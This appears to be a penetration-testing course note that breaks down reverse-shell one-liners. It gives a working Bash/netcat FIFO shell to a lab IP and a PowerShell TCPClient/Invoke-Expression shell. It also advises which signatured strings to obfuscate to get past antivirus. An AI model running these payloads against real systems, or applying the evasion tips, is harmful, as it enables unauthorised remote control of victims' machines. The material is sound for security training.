# THEORY — Introduction to Payloads

## ID
404

## Module
Shells & Payloads

## Kind
theory

## Title
Section 6 — Introduction to Payloads

## Description
Dissects the Netcat/Bash and PowerShell reverse-shell one-liners line by line. Understanding what each fragment does (FIFO, named pipes, TCPClient, Invoke-Expression) lets you modify payloads when AV/firewall blocks the stock version.

## Tags
payloads, one-liners, mkfifo, tcpclient, invoke-expression, .net, fifo

## TL;DR — What's Important
- A **payload** = the code/commands that exploit the vuln and deliver the shell.
- "Malware" is just payloads — same code, neutral framing.
- Knowing what your payload *actually does* lets you modify it when AV blocks it.
- Linux one-liner uses `mkfifo` + `nc`; Windows uses `System.Net.Sockets.TCPClient`.

## What This Section Covers
Walks through the two one-liners from prior sections, command by command. The point isn't memorization — it's recognizing the building blocks so you can recombine them when stock payloads get blocked.

## Bash/Netcat One-Liner Decomposed
```shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```
| Fragment | Purpose |
|----------|---------|
| `rm -f /tmp/f;` | Wipe old FIFO; `-f` ignores missing file |
| `mkfifo /tmp/f;` | Create a named pipe (FIFO) at `/tmp/f` |
| `cat /tmp/f \|` | Read from FIFO; pipe its contents to next command's stdin |
| `/bin/bash -i 2>&1 \|` | Interactive bash; merge stderr into stdout |
| `nc 10.10.14.12 7777 > /tmp/f` | Connect to attacker on port 7777; write incoming bytes back into FIFO |

The FIFO is the trick — it lets a unidirectional pipe behave bidirectionally.

## PowerShell One-Liner Decomposed
```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443); ..."
```
| Fragment | Purpose |
|----------|---------|
| `powershell -nop -c` | Launch pwsh, **no profile**, execute string |
| `New-Object System.Net.Sockets.TCPClient('<ip>',<port>)` | Open TCP connection to attacker |
| `$stream = $client.GetStream()` | Get bidirectional stream over the socket |
| `[byte[]]$bytes = 0..65535\|%{0}` | 64KB empty buffer |
| `while(($i = $stream.Read(...)) -ne 0)` | Read loop until stream closes |
| `(New-Object ASCIIEncoding).GetString($bytes,0,$i)` | Decode incoming bytes → ASCII string |
| `iex $data 2>&1 \| Out-String` | **Invoke-Expression** runs the received text as PS code |
| `$sendback + 'PS ' + (pwd).Path + '> '` | Build response with fake prompt |
| `$stream.Write(...)` | Send result back over socket |
| `$client.Close()` | Close on exit |

The Nishang `Invoke-PowerShellTcp` script is the parameterized version of this same logic — supports both `-Reverse` and `-Bind` modes.

## Why Decompose At All?
- AV blocks based on signatures of common payload strings (`New-Object System.Net.Sockets.TCPClient`, `iex`, etc.). Reading the decomposition tells you which strings to obfuscate.
- Staged vs stageless, named-pipe vs raw TCP, encoded vs plain — every choice trades off against detection.
- Frameworks (Metasploit, MSFvenom) automate the same building blocks.

## Key Takeaways
- Linux one-liners revolve around **FIFOs** to bridge stdin/stdout across `nc`.
- Windows one-liners revolve around **.NET TCPClient + Invoke-Expression**.
- Read every payload before deploying it — comments and author signatures get you flagged.
- The Nishang script and the one-liner do the same thing — one is just easier to read/modify.

## Gotchas
- `iex` (alias for `Invoke-Expression`) is one of the most-signatured PowerShell calls — obfuscation targets it specifically.
- `-nop` (no profile) is essential — profile scripts can log or block.
- Leaving the cheat-sheet comments inside your payload tells AV exactly which public source you copied from.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|shells-payloads]]
← [[05-reverse-shells]] | [[07-automating-payloads-metasploit]] →
<!-- AUTO-LINKS-END -->
